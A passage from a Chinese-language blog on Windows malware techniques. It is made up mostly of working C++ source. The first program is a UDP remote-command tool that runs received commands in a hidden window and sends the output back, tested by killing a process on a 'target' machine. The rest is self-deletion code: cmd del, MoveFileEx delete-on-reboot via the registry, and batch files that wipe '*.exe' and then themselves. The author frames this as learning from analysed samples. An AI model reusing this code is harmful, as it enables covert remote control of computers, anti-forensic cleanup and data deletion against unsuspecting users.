class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line">SOCKET SktUDP;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MySendMessage</span><span class="params">(LPCSTR sIP, <span class="keyword">int</span> iPort,<span class="keyword">char</span> *message,<span class="keyword">int</span> sizeofmessage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sockaddr_in addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> out = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = htons(iPort);</span><br><span class="line">    addr.sin_addr.S_un.S_addr = inet_addr(sIP);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">    </span><br><span class="line">    out = sendto(SktUDP, message, sizeofmessage, <span class="number">0</span>, (sockaddr*)&amp;addr, addr_len);</span><br><span class="line">    <span class="keyword">if</span> (out == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, WSAGetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyRemoteCmd</span><span class="params">(<span class="keyword">char</span>* lpCommandLine, <span class="keyword">char</span>* buffer, DWORD buffersize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE  hReadPipe = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE  hWritePipe = <span class="literal">NULL</span>;</span><br><span class="line">    SECURITY_ATTRIBUTES securityattributes = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置SECURITY_ATTRIBUTES结构体属性。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//大小</span></span><br><span class="line">    securityattributes.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">    <span class="comment">//可被创建的新进程继承句柄。</span></span><br><span class="line">    securityattributes.bInheritHandle = TRUE;</span><br><span class="line">    securityattributes.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (CreatePipe(&amp;hReadPipe, &amp;hWritePipe, &amp;securityattributes, <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreatePipe Failed!!! %d&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));<span class="comment">//用来将指定的内存块清零。</span></span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">    <span class="comment">//隐藏窗口</span></span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;<span class="comment">//STARTF_USESTDHANDLES这个代表指定是进程的标准输入输出句柄</span></span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line">    <span class="comment">//设置输出句柄和标准错误句柄</span></span><br><span class="line">    si.hStdOutput = hWritePipe;</span><br><span class="line">    si.hStdError = hWritePipe;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置为继承句柄，将返回数据写入管道</span></span><br><span class="line">    <span class="keyword">if</span> (CreateProcessA(<span class="number">0</span>, lpCommandLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//等待子进程结束</span></span><br><span class="line">    WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line">    WaitForSingleObject(pi.hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//利用ReadFile读取管道数据，CreatePipe函数的评论也讲到利用ReadFile来读取数据</span></span><br><span class="line">    ReadFile(hReadPipe, buffer, buffersize, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//关闭句柄 </span></span><br><span class="line">    CloseHandle(pi.hProcess);</span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">    CloseHandle(hWritePipe);</span><br><span class="line">    CloseHandle(hReadPipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//fu 127.0.0.1 2333  ke 127.0.0.1 1234</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc_recvform</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接受连接请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> message[<span class="number">0x5000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sockaddr_in addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">        <span class="keyword">int</span> out = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(message, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));</span><br><span class="line">        <span class="comment">//接收信息</span></span><br><span class="line">        out = recvfrom(SktUDP, message, <span class="number">0x5000</span>, <span class="number">0</span>, (sockaddr*)&amp;addr, &amp;addr_len);</span><br><span class="line">        <span class="keyword">if</span> (out &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;recv from :%s\n&quot;</span>, message);</span><br><span class="line">        <span class="comment">//当接受到的消息的长度小于默认认为是cmd命令</span></span><br><span class="line">        <span class="keyword">if</span> (out &lt; <span class="number">40</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> cmd[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">            <span class="keyword">char</span> szBuffer[<span class="number">0x5000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">            DWORD dwBufferSize = <span class="number">0x5000</span>;</span><br><span class="line">            <span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, dwBufferSize);</span><br><span class="line">            <span class="built_in">strcpy</span>(cmd, message);</span><br><span class="line">            <span class="keyword">if</span> (MyRemoteCmd(cmd, szBuffer, dwBufferSize) == FALSE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//cmd命令不正常跳过发送命令</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strlen</span>(szBuffer))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//提前设置好发送消息的端口</span></span><br><span class="line">                MySendMessage(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">2333</span>, szBuffer, <span class="built_in">strlen</span>(szBuffer));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MySktUDP</span><span class="params">(LPCSTR sIP, <span class="keyword">int</span> iPort)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//WSAStartup初始化</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup Failed!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//socket 创建套接字</span></span><br><span class="line">    SktUDP = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (SktUDP == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket Failed!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//配置服务器信息</span></span><br><span class="line">    sockaddr_in server_addr;</span><br><span class="line">    server_addr.sin_family = AF_INET;</span><br><span class="line">    server_addr.sin_port = htons(iPort);</span><br><span class="line">    server_addr.sin_addr.S_un.S_addr = inet_addr(sIP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//绑定服务器</span></span><br><span class="line">    <span class="keyword">if</span> (bind(SktUDP, (<span class="keyword">const</span> sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind Failed!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建线程来接收消息</span></span><br><span class="line">    CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc_recvform, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> sIP[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> iPort = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input IP and Port:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, sIP, &amp;iPort);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> (MySktUDP(sIP, iPort))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind success!!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input Dest IP and Dest Port:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, sIP, &amp;iPort);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">while</span> (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//输入信息，发送信息</span></span><br><span class="line">        <span class="keyword">char</span> message[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        gets_s(message, MAX_PATH);</span><br><span class="line">        MySendMessage(sIP, iPort, message,<span class="built_in">strlen</span>(message));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是也有不好的地方，就是对于命令返回数据过多的的时候会崩掉，主要是设置的空间有限，UDP的单次传输大小好像也有个上限，但是对于普通的命令还是没什么问题，而且能够执行的命令有限不能启动exe文件，不然会导致命令接收端卡住。</p><p>下面是测试结果，关闭目标电脑上的notepad.exe，dos命令taskkill /f /im notepad.exe /t<br><img src="https://s2.loli.net/2022/01/21/UOJ5GsiSMtldue3.png"></p><h3 id="自删除"><a href="#自删除" class="headerlink" title="自删除"></a>自删除</h3><p>之前分析一个样本见到的，利用cmd命令删除，/c del filename &gt;&gt; NUL。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CHAR Filename[<span class="number">260</span>];</span><br><span class="line">CHAR Parameters[<span class="number">260</span>];</span><br><span class="line"></span><br><span class="line">GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x104</span>u);</span><br><span class="line">GetShortPathNameA(Filename, Filename, <span class="number">0x104</span>u);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, Filename);</span><br><span class="line"><span class="built_in">strcpy</span>(Parameters, <span class="string">&quot;/c del &quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(Parameters, Filename);</span><br><span class="line"><span class="built_in">strcat</span>(Parameters, <span class="string">&quot; &gt;&gt; NUL&quot;</span>);</span><br><span class="line">ShellExecuteA(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;cmd.exe&quot;</span>, Parameters, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用MoveFileEx函数实现。</p><pre><code>BOOL MoveFileExA(  [in]           LPCSTR lpExistingFileName,  [in, optional] LPCSTR lpNewFileName,  [in]           DWORD  dwFlags);</code></pre><p>如果dwFlags指定MOVEFILE_DELAY_UNTIL_REBOOT并且 lpNewFileName为 NULL， 则MoveFileEx注册 lpExistingFileName文件以在系统重新启动时删除。</p><p>注意点：在此函数的 ANSI 版本中，名称仅限于MAX_PATH字符。要将此限制扩展到 32,767 个宽字符，请调用函数的 Unicode 版本并在前面加上“?” 到路径。有关详细信息，请参阅 命名文件</p><p>提示  从 Windows 10 版本 1607 开始，对于此函数的 unicode 版本 ( MoveFileExW )，您可以选择加入以删除MAX_PATH限制，而无需预先添加“\?\”。有关详细信息，请参阅命名文件、路径和命名空间的“最大路径长度限制”部分。</p><p>对于文件 I/O，路径字符串的“\?\”前缀告诉 Windows API 禁用所有字符串解析并将其后面的字符串直接发送到文件系统。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">test2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CHAR Filename[MAX_PATH];</span><br><span class="line">CHAR szTemp[MAX_PATH] = <span class="string">&quot;\\\\?\\&quot;</span>;</span><br><span class="line"></span><br><span class="line">GetModuleFileName(<span class="number">0</span>, Filename, MAX_PATH);</span><br><span class="line"><span class="built_in">strcat</span>(szTemp, Filename);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, szTemp);</span><br><span class="line">BOOL Ret= MoveFileEx(szTemp, <span class="literal">NULL</span>, MOVEFILE_DELAY_UNTIL_REBOOT);</span><br><span class="line"><span class="keyword">if</span> (Ret == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后当然我去执行代码去发现报错，GetLastError的值为5，无法访问，意思就是权限不够。然后我又去读了官方文档的评论。</p><pre><code>如果dwFlags参数指定 MOVEFILE_DELAY_UNTIL_REBOOT， 则如果无法访问注册表，则MoveFileEx将失败。该函数将重新启动时要重命名的文件的位置存储在以下注册表值中： HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Control \ Session Manager \ PendingFileRenameOperations此注册表值属于REG_MULTI_SZ类型。每个重命名操作都存储以下以 NULL 结尾的字符串之一，具体取决于重命名是否为删除：szDstFile \0\0szSrcFile \0 szDstFile \0字符串szDstFile \0\0 表示文件 szDstFile将在重新启动时被删除。字符串 szSrcFile \0 szDstFile \0 表示 szSrcFile将在重新启动时重命名为szDstFile。</code></pre><p>所以这个函数的本质是修改注册表相关位置，然后在重新启动时，进行删除操作。</p><p>接下来我们以管理员身份启动该程序，然后去查看注册表相关位置。<br><img src="https://s2.loli.net/2022/01/21/67jnkuCmIhoB3vz.png"><br>然后如果重新启动计算机，就会发现这个exe不见了。</p><p>还有种方法就是批处理了，实际上就和第一种差不多，只不过是写成了bat文件，然后CreateProcess函数隐藏窗口执行bat文件。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CreateChoiceBat</span><span class="params">(<span class="keyword">char</span> *pszBatFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> iTime = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">char</span> szBat[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造批处理内容</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">@echo off</span></span><br><span class="line"><span class="comment">choice /t 5 /d y /n &gt;nul</span></span><br><span class="line"><span class="comment">del *.exe</span></span><br><span class="line"><span class="comment">del %0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">::wsprintf(szBat, <span class="string">&quot;@echo off\nchoice /t %d /d y /n &gt;nul\ndel *.exe\ndel %%0\n&quot;</span>, iTime);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成批处理文件</span></span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">fopen_s(&amp;fp, pszBatFileName, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(szBat, (<span class="number">1</span> + ::lstrlen(szBat)), <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CreatePingBat</span><span class="params">(<span class="keyword">char</span> *pszBatFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> iTime = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">char</span> szBat[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造批处理内容</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">@echo off</span></span><br><span class="line"><span class="comment">ping 127.0.0.1 -n 5</span></span><br><span class="line"><span class="comment">del *.exe</span></span><br><span class="line"><span class="comment">del %0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">::wsprintf(szBat, <span class="string">&quot;@echo off\nping 127.0.0.1 -n %d\ndel *.exe\ndel %%0\n&quot;</span>, iTime);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成批处理文件</span></span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">fopen_s(&amp;fp, pszBatFileName, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(szBat, (<span class="number">1</span> + ::lstrlen(szBat)), <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">DelSelf</span><span class="params">(<span class="keyword">int</span> iType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL bRet = FALSE;</span><br><span class="line"><span class="keyword">char</span> szCurrentDirectory[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> szBatFileName[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> szCmd[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前程序所在目录</span></span><br><span class="line">::GetModuleFileName(<span class="literal">NULL</span>, szCurrentDirectory, MAX_PATH);</span><br><span class="line"><span class="keyword">char</span> *p = <span class="built_in">strrchr</span>(szCurrentDirectory, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">p[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="comment">// 构造批处理文件路径</span></span><br><span class="line">::wsprintf(szBatFileName, <span class="string">&quot;%s\\temp.bat&quot;</span>, szCurrentDirectory);</span><br><span class="line"><span class="comment">// 构造调用执行批处理的 CMD 命令行</span></span><br><span class="line">::wsprintf(szCmd, <span class="string">&quot;cmd /c call \&quot;%s\&quot;&quot;</span>, szBatFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 